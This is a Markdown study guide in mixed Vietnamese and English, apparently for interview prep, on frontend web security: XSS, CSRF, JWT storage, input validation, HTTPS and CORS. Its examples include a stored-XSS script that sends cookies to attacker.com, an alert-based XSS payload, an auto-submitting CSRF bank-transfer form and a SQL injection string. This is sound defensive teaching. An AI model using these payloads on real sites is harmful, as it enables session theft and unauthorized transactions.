# Security

Web security best practices cho frontend applications.

---

## Table of Contents

1. [XSS Prevention](#1-xss-prevention)
2. [CSRF Protection](#2-csrf-protection)
3. [Authentication Best Practices](#3-authentication-best-practices)
4. [Input Validation & Sanitization](#4-input-validation--sanitization)
5. [HTTPS & CORS](#5-https--cors)

---
## 5. Security

### 5.1. XSS Prevention

**Câu trả lời chuẩn Senior:**

XSS (Cross-Site Scripting) là attack injection malicious scripts vào web pages.

#### **Types of XSS**

**1. Stored XSS** - Malicious script lưu trên server

```html
<!-- Attacker submits comment: -->
<script>
  document.location = "http://attacker.com/steal?cookie=" + document.cookie;
</script>

<!-- Other users load page and script executes -->
```

**2. Reflected XSS** - Script trong URL parameters

```
https://example.com/search?q=<script>alert('XSS')</script>
```

**3. DOM-based XSS** - Script thay đổi DOM

```js
// Vulnerable code
document.getElementById("output").innerHTML = location.hash.substring(1);

// Attacker URL: https://example.com#<img src=x onerror=alert('XSS')>
```

#### **Vue 3 Built-in Protection**

```vue
<template>
  <!-- ✅ SAFE: Vue auto-escapes text interpolation -->
  <div>{{ userInput }}</div>
  <!-- If userInput = "<script>alert('xss')</script>" -->
  <!-- Renders as: &lt;script&gt;alert('xss')&lt;/script&gt; -->

  <!-- ❌ DANGEROUS: v-html renders raw HTML -->
  <div v-html="userInput"></div>
  <!-- Script will execute! -->

  <!-- ✅ SAFE: Attribute binding -->
  <div :title="userInput">Hover</div>
  <!-- Vue escapes attributes -->
</template>
```

#### **Sanitize HTML**

```ts
import DOMPurify from "dompurify";

// Sanitize before rendering
const cleanHTML = DOMPurify.sanitize(dirtyHTML);
```

```vue
<template>
  <div v-html="sanitizedHTML"></div>
</template>

<script setup>
import { computed } from "vue";
import DOMPurify from "dompurify";

const props = defineProps<{ html: string }>();

const sanitizedHTML = computed(() => DOMPurify.sanitize(props.html));
</script>
```

#### **Content Security Policy (CSP)**

```html
<!-- In HTML -->
<meta
  http-equiv="Content-Security-Policy"
  content="default-src 'self'; script-src 'self' 'nonce-{random}'; style-src 'self' 'unsafe-inline';"
/>
```

```js
// In server response headers
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com; object-src 'none';
```

#### **Best Practices**

```ts
// ✅ Validate input
function validateEmail(email: string): boolean {
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  return emailRegex.test(email);
}

// ✅ Encode output
function escapeHTML(str: string): string {
  return str
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}

// ✅ Use textContent instead of innerHTML
element.textContent = userInput; // Safe
element.innerHTML = userInput; // Dangerous

// ❌ Avoid eval()
eval(userInput); // NEVER do this

// ❌ Avoid Function constructor with user input
new Function(userInput)(); // Dangerous
```

---

### 5.2. CSRF Protection

**Câu trả lời chuẩn Senior:**

CSRF (Cross-Site Request Forgery) tricks user vào executing unwanted actions.

#### **How CSRF Works**

```html
<!-- Attacker's website -->
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker-account" />
  <input type="hidden" name="amount" value="10000" />
</form>
<script>
  document.forms[0].submit(); // Auto-submit when page loads
</script>

<!-- If user is logged into bank.com, transfer executes! -->
```

#### **CSRF Token Pattern**

```ts
// Backend generates token
const csrfToken = crypto.randomBytes(32).toString("hex");
res.cookie("XSRF-TOKEN", csrfToken);

// Frontend includes token in requests
axios.defaults.headers.common["X-XSRF-TOKEN"] = getCookie("XSRF-TOKEN");

// Backend validates token
if (req.headers["x-xsrf-token"] !== req.cookies["XSRF-TOKEN"]) {
  return res.status(403).json({ error: "Invalid CSRF token" });
}
```

#### **Axios Auto CSRF**

```ts
// axios automatically reads XSRF-TOKEN cookie
// and adds to X-XSRF-TOKEN header
import axios from "axios";

axios.defaults.xsrfCookieName = "XSRF-TOKEN";
axios.defaults.xsrfHeaderName = "X-XSRF-TOKEN";
```

#### **SameSite Cookies**

```js
// Server sets cookie with SameSite attribute
res.cookie("sessionId", token, {
  httpOnly: true,
  secure: true,
  sameSite: "strict", // or 'lax' or 'none'
});

// SameSite=Strict: Cookie only sent for same-site requests
// SameSite=Lax: Cookie sent for top-level navigation
// SameSite=None: Cookie sent cross-site (requires Secure)
```

---

### 5.3. Authentication Best Practices

**Câu trả lời chuẩn Senior:**

#### **JWT Storage**

```ts
// ❌ BAD: localStorage (vulnerable to XSS)
localStorage.setItem("token", jwt);

// ✅ GOOD: httpOnly cookie (not accessible to JavaScript)
// Server sets:
res.cookie("token", jwt, {
  httpOnly: true,
  secure: true,
  sameSite: "strict",
  maxAge: 3600000,
});

// ✅ ALTERNATIVE: Memory + Refresh Token pattern
let accessToken = null; // In memory, lost on refresh

// Store refresh token in httpOnly cookie
// Use refresh token to get new access token
```

#### **Refresh Token Flow**

```ts
// 1. Login: Get access + refresh tokens
const login = async (email, password) => {
  const { accessToken, refreshToken } = await api.post("/auth/login", {
    email,
    password,
  });

  // Store access token in memory
  setAccessToken(accessToken);

  // Refresh token sent as httpOnly cookie by server
  return true;
};

// 2. API call with access token
axios.interceptors.request.use((config) => {
  const token = getAccessToken();
  if (token) {
    config.headers.Authorization = `Bearer ${token}`;
  }
  return config;
});

// 3. Handle 401: Refresh token
axios.interceptors.response.use(
  (response) => response,
  async (error) => {
    const originalRequest = error.config;

    if (error.response?.status === 401 && !originalRequest._retry) {
      originalRequest._retry = true;

      try {
        // Call refresh endpoint (sends httpOnly cookie automatically)
        const { accessToken } = await api.post("/auth/refresh");
        setAccessToken(accessToken);

        // Retry original request
        originalRequest.headers.Authorization = `Bearer ${accessToken}`;
        return axios(originalRequest);
      } catch (refreshError) {
        // Refresh failed, redirect to login
        router.push("/login");
        return Promise.reject(refreshError);
      }
    }

    return Promise.reject(error);
  }
);
```

#### **Password Hashing (Backend)**

```ts
// ❌ NEVER store plain text passwords
users.password = password;

// ❌ NEVER use weak hashing (MD5, SHA1)
users.password = md5(password);

// ✅ Use bcrypt with salt
import bcrypt from "bcrypt";

const saltRounds = 12;
const hashedPassword = await bcrypt.hash(password, saltRounds);

// Verify
const isValid = await bcrypt.compare(inputPassword, hashedPassword);
```

---

### 5.4. Input Validation & Sanitization

**Câu trả lời chuẩn Senior:**

#### **Frontend Validation**

```ts
import { z } from "zod";

// Define schema
const userSchema = z.object({
  email: z.string().email("Invalid email"),
  password: z.string().min(8, "Password must be at least 8 characters"),
  age: z.number().min(18, "Must be 18+").max(120),
});

// Validate
try {
  const user = userSchema.parse(formData);
  // Valid!
} catch (error) {
  if (error instanceof z.ZodError) {
    console.log(error.errors);
  }
}
```

#### **Backend Validation (Never trust frontend)**

```ts
// Express + Zod
import { z } from "zod";

const createUserSchema = z.object({
  body: z.object({
    email: z.string().email(),
    password: z.string().min(8).max(100),
  }),
});

app.post("/users", validate(createUserSchema), async (req, res) => {
  // req.body is validated
});
```

#### **SQL Injection Prevention**

```ts
// ❌ NEVER concatenate SQL queries
const query = `SELECT * FROM users WHERE email = '${email}'`;
// Attacker input: ' OR '1'='1

// ✅ Use parameterized queries
const query = "SELECT * FROM users WHERE email = ?";
db.execute(query, [email]);

// ✅ Or use ORM
const user = await User.findOne({ where: { email } });
```

---

### 5.5. HTTPS & CORS

**Câu trả lời chuẩn Senior:**

#### **HTTPS**

```ts
// Always use HTTPS in production
// Redirect HTTP to HTTPS
app.use((req, res, next) => {
  if (req.header("x-forwarded-proto") !== "https") {
    return res.redirect(`https://${req.header("host")}${req.url}`);
  }
  next();
});

// Set Strict-Transport-Security header
app.use((req, res, next) => {
  res.setHeader(
    "Strict-Transport-Security",
    "max-age=31536000; includeSubDomains"
  );
  next();
});
```

#### **CORS Configuration**

```ts
// ❌ BAD: Allow all origins
app.use(
  cors({
    origin: "*",
  })
);

// ✅ GOOD: Whitelist specific origins
const allowedOrigins = ["https://myapp.com", "https://admin.myapp.com"];

app.use(
  cors({
    origin: (origin, callback) => {
      if (!origin || allowedOrigins.includes(origin)) {
        callback(null, true);
      } else {
        callback(new Error("Not allowed by CORS"));
      }
    },
    credentials: true, // Allow cookies
    methods: ["GET", "POST", "PUT", "DELETE"],
    allowedHeaders: ["Content-Type", "Authorization"],
  })
);
```

---


---

[← Back to Overview](../README.md)
